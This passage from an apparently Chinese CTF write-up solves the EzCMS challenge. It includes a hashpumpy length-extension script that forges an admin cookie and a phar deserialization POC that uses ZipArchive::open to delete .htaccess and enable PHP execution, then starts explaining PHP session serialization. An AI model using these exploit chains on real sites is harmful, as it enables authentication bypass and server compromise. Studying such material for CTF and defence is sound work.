<p>到这儿，就得去整体分析源码了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;EzCMS&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;Upload platform&lt;/h2&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;p&gt;假装这还是个无敌炫酷的前端&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;upload.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;upload&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> (<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file_tmp</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_error</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file_error</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;something error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$admin</span> = <span class="keyword">new</span> <span class="title class_">Admin</span>(<span class="variable">$file_name</span>, <span class="variable">$file_tmp</span>, <span class="variable">$file_size</span>);</span><br><span class="line">    <span class="variable">$admin</span>-&gt;<span class="title function_ invoke__">upload_file</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;sandbox/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$sandbox</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$sandbox</span>.<span class="string">&#x27;/.htaccess&#x27;</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$sandbox</span>.<span class="string">&#x27;/.htaccess&#x27;</span>, <span class="string">&#x27;lolololol, i control all&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;view my file : &quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$path</span> = <span class="string">&quot;./&quot;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    <span class="variable">$dir</span> = <span class="title function_ invoke__">opendir</span>(<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">while</span> ((<span class="variable">$filename</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$dir</span>)) !== <span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$filename</span> != <span class="string">&#x27;.&#x27;</span> &amp;&amp; <span class="variable">$filename</span> != <span class="string">&#x27;..&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$files</span>[] = <span class="variable">$filename</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">        <span class="variable">$filepath</span> = <span class="variable">$path</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$v</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">        &lt;div style=&quot;width: 1000px; height: 30px;&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;Ariel&gt;filename: <span class="subst">&#123;$v&#125;</span>&lt;/Ariel&gt;</span></span><br><span class="line"><span class="string">        &lt;a href=&quot;view.php?filename=<span class="subst">&#123;$v&#125;</span>&amp;filepath=<span class="subst">&#123;$filepath&#125;</span>&quot;&gt;view detail&lt;/a&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">closedir</span>(<span class="variable">$dir</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在index.php里，我们传入username和password，密码不能为admin即可正常登录，赋值给session接下来调用了login()函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$secret</span> = <span class="string">&quot;********&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;hash&quot;</span>, <span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="string">&quot;adminadmin&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>login函数将密钥和adminadmin拼接。然后MD5加密。赋值给cookies[‘hash’]<br>
也就是说。我们登陆成功后。会有一个cookie hash:md5(密钥+‘adminadmin’)<br>
继续往下看。登陆成功后。会到upload页面。上传文件显示不是admin。那么我们就着重看下这部分代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file_tmp</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_error</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    <span class="comment">//上传中的一些操作，给变量赋值啥的。</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file_error</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;something error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$admin</span> = <span class="keyword">new</span> <span class="title class_">Admin</span>(<span class="variable">$file_name</span>, <span class="variable">$file_tmp</span>, <span class="variable">$file_size</span>);</span><br><span class="line">    <span class="variable">$admin</span>-&gt;<span class="title function_ invoke__">upload_file</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;sandbox/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$sandbox</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里程序调用了admin类中的upload_file功能，接着往下看</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file_tmp</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$upload_dir</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content_check</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$file_tmp</span>, <span class="variable">$size</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;upload_dir = <span class="string">&#x27;sandbox/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;upload_dir))&#123;</span><br><span class="line">            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$this</span>-&gt;upload_dir, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$this</span>-&gt;upload_dir.<span class="string">&#x27;/.htaccess&#x27;</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;upload_dir.<span class="string">&#x27;/.htaccess&#x27;</span>, <span class="string">&#x27;lolololol, i control all&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="variable">$size</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file_tmp = <span class="variable">$file_tmp</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content_check = <span class="keyword">new</span> <span class="title class_">Check</span>(<span class="variable language_">$this</span>-&gt;file_tmp);</span><br><span class="line">        <span class="variable">$profile</span> = <span class="keyword">new</span> <span class="title class_">Profile</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;checker = <span class="variable">$profile</span>-&gt;<span class="title function_ invoke__">is_admin</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;u r not admin&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content_check -&gt; <span class="title function_ invoke__">check</span>();</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$tmp</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;size &gt; <span class="number">204800</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;your file is too big&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$this</span>-&gt;file_tmp, <span class="variable">$this</span>-&gt;upload_dir.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;filename).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$ext</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看到了关键代码。调用了$this-&gt;checker,如果不为True，就输出不是admin</p>
<p>继续追踪代码profile类中的is_admin函数</p>
<p>接着往下看</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_admin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable">$secret</span> = <span class="string">&quot;********&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;password != <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>] === <span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="variable">$this</span>-&gt;username.<span class="variable">$this</span>-&gt;password))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到。将我们之前登陆的用户名密码赋值给username和password<br>
然后定义了一个密钥。<br>
判断我们之前输出的用户名是不是admin。密码不能是admin<br>
然后将密钥和用户名密码拼接。MD5加密。将加密结果和cookies[‘user’]进行比较<br>
这里我们有三个可控点。用户名+密码+cookies[‘user’]</p>
<p>这里可以先使用hash拓展攻击，写个hashpump脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">sign = <span class="string">&#x27;52107b08c0f3342d2153ae1d68e6262c&#x27;</span> <span class="comment">#从cookie中获得</span></span><br><span class="line">param=<span class="string">&#x27;admin&#x27;</span></span><br><span class="line">sign,add_data = hashpumpy.hashpump(sign,<span class="string">&#x27;adminadmin&#x27;</span>,<span class="string">&#x27;123&#x27;</span>,<span class="number">8</span>) <span class="comment">#登录时密码为123，用户名为admin,admin+123长度为8</span></span><br><span class="line">add_data = add_data[<span class="built_in">len</span>(param):]</span><br><span class="line"><span class="built_in">print</span>(sign)</span><br><span class="line"><span class="built_in">print</span>(add_data)</span><br><span class="line"><span class="built_in">print</span>(urllib.parse.quote(add_data))</span><br></pre></td></tr></table></figure>
<p>获得<code>admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00123</code></p>
<p>再添加一个名为user的cookie，值为4b2928c6b562e5e4dbd35df611b46487<br>
用新的密码重新登录，正常登录之后上传文件能够显示正常路径。</p>
<p>随便上传一个php文件可以发现存在一个.htaccess文件，使得上传的php文件无法解析<br>
存在一个检测上传文件mime类型的功能，猜测存在phar反序列化,看看config.php中的代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_detail</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i&#x27;</span>, <span class="variable">$this</span>-&gt;filepath))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonono~&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$mine</span> = <span class="title function_ invoke__">mime_content_type</span>(<span class="variable">$this</span>-&gt;filepath);</span><br><span class="line">        <span class="variable">$store_path</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;filepath);</span><br><span class="line">        <span class="variable">$res</span>[<span class="string">&#x27;mine&#x27;</span>] = <span class="variable">$mine</span>;</span><br><span class="line">        <span class="variable">$res</span>[<span class="string">&#x27;store_path&#x27;</span>] = <span class="variable">$store_path</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>使用了mime_content_type函数来检测文件mime类型</p>
<p>寻找利用链</p>
<p>首先寻找__destruct方法，只有一个</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//config.php File类</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;checker))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checker-&gt;<span class="title function_ invoke__">upload_file</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>Admin类存在upload_file方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;u r not admin&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content_check -&gt; <span class="title function_ invoke__">check</span>();</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$tmp</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;size &gt; <span class="number">204800</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;your file is too big&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$this</span>-&gt;file_tmp, <span class="variable">$this</span>-&gt;upload_dir.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;filename).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$ext</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>发现Profile类存在一个__call方法、</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//__call会在在调用的方法不存在时会自动调用</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>Profile类不存在upload_file方法，因此把checker车位Profile类的话就会调用这个__call函数<br>
接下来的问题就是要找到一个具有open方法的类</p>
<p><strong>使用ZipArchive::open删除.htaccess</strong></p>
<p>最后的poc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;text&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;script language=&quot;php&quot;&gt;__HALT_COMPILER();&lt;/script&gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$admin</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;checker=<span class="variable">$admin</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin=<span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&quot;/var/www/html/sandbox/1050a6a70986f01594e231dadd01f541/.htaccess&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = ZIPARCHIVE::<span class="variable constant_">OVERWRITE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$admin</span> = <span class="keyword">new</span> <span class="title class_">Profile</span>();</span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> <span class="title class_">File</span>(<span class="variable">$admin</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$object</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$object</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>代码很简单。准备两个类。然后将需要用到的变量赋值。生成phar就好了<br>
上传phar.phar，然后通过view.php触发。</p>
<h3 id="session反序列化"><a class="markdownIt-Anchor" href="#session反序列化"></a> Session反序列化</h3>
<p>该节内容摘抄自<a href="https://www.freebuf.com/articles/web/324519.html">PHP session反序列化漏洞原理解析 - FreeBuf网络安全行业门户</a>，session反序列化的实用性还是蛮强的，harden3师傅写的很细~</p>
<h4 id="什么是session"><a class="markdownIt-Anchor" href="#什么是session"></a> 什么是session</h4>
<p>官方<code>Session</code>定义：在计算机中，尤其是在网络应用中，称为“会话控制”。<code>Session</code>对象存储特定用户会话所需的属性及配置信息。主要有以下特点：</p>
<blockquote>
<p><code>session</code>保存的位置是在服务器端</p>
<p><code>session</code>通常是要配合<code>cookie</code>使用</p>
</blockquote>
<p>因为HTTP的无状态性，服务端产生了<code>session</code>来标识当前的用户状态</p>
<p>本质上，<code>session</code>就是一种可以维持服务器端的数据存储技术。即**<code>session</code>技术就是一种基于后端有别于数据库的临时存储数据的技术**</p>
<h4 id="php-session工作流程"><a class="markdownIt-Anchor" href="#php-session工作流程"></a> PHP session工作流程</h4>
<p>以PHP为例，理解<code>session</code>的原理</p>
<ol>
<li>PHP脚本使用 session_start()时开启<code>session</code>会话，会自动检测<code>PHPSESSID</code>
<ul>
<li>如果<code>Cookie</code>中存在，获取<code>PHPSESSID</code></li>
<li>如果<code>Cookie</code>中不存在，创建一个<code>PHPSESSID</code>，并通过响应头以<code>Cookie</code>形式保存到浏览器</li>
</ul>
</li>
<li>初始化超全局变量<code>$_SESSION</code>为一个空数组</li>
<li>PHP通过<code>PHPSESSID</code>去指定位置（<code>PHPSESSID</code>文件存储位置）匹配对应的文件
<ul>
<li>存在该文件：读取文件内容（通过反序列化方式），将数据存储到<code>$_SESSION</code>中</li>
<li>不存在该文件： session_start()创建一个<code>PHPSESSID</code>命名文件</li>
</ul>
</li>
<li>程序执行结束，将<code>$_SESSION</code>中保存的所有数据序列化存储到<code>PHPSESSID</code>对应的文件中</li>
</ol>
<p>具体原理图：</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988659_622b0d7380818dab56a63-166727395787419.jpeg" alt="img"></p>
<h4 id="phpini-session配置"><a class="markdownIt-Anchor" href="#phpini-session配置"></a> php.ini session配置</h4>
<p><code>php.ini</code>里面有较重要的<code>session</code>配置项</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">session.save_path</span>=<span class="string">&quot;/tmp&quot;</span>      --设置session文件的存储位置</span><br><span class="line"><span class="attr">session.save_handler</span>=files    --设定用户自定义存储函数，如果想使用PHP内置session存储机制之外的可以使用这个函数</span><br><span class="line"><span class="attr">session.auto_start</span>= <span class="number">0</span>          --指定会话模块是否在请求开始时启动一个会话，默认值为 <span class="number">0</span>，不启动</span><br><span class="line"><span class="attr">session.serialize_handler</span>= php --定义用来序列化/反序列化的处理器名字，默认使用php  </span><br><span class="line"><span class="attr">session.upload_progress.enabled</span>= <span class="literal">On</span> --启用上传进度跟踪，并填充$ _SESSION变量，默认启用</span><br><span class="line"><span class="attr">session.upload_progress.cleanup</span>= <span class="literal">oN</span> --读取所有POST数据（即完成上传）后立即清理进度信息，默认启用</span><br></pre></td></tr></table></figure>
<h4 id="php-session序列化机制"><a class="markdownIt-Anchor" href="#php-session序列化机制"></a> PHP session序列化机制</h4>
<p>根据<code>php.ini</code>中的配置项，我们研究将<code>$_SESSION</code>中保存的所有数据序列化存储到<code>PHPSESSID</code>对应的文件中，使用的三种不同的处理格式，即<code>session.serialize_handler</code>定义的三种引擎：</p>
<table>
<thead>
<tr>
<th style="text-align:center">处理器</th>
<th style="text-align:center">对应的存储格式</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">php</td>
<td style="text-align:center">键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值</td>
</tr>
<tr>
<td style="text-align:center">php_binary</td>
<td style="text-align:center">键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值</td>
</tr>
<tr>
<td style="text-align:center">php_serialize (php&gt;=5.5.4)</td>
